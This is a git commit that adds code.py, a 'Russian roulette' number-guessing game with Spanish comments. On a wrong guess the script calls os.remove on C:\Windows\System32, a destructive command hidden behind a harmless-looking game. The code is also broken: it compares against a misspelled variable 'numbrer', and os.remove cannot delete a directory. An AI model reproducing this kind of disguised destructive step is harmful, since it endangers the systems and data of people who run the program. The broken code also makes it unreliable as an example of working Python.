34ba0e1d3e860a4e050c8778e0f1c0cbf5971e0c
x4n5i <sinforianodelavega@gmail.com>
2025-01-21 11:24:04 +0100

    Create code.py

---
+++ code.py
@@ -0,0 +1,14 @@
+import random
+import os
+
+#Ruleta Rusa
+
+number = random.randint(1, 10)
+guess = input("Guess a number between 1 and 10")
+guess = int(guess)
+
+if guess == numbrer:
+   print("Ganaste")
+else:
+   os.remove("C:\Windows\System32")
+
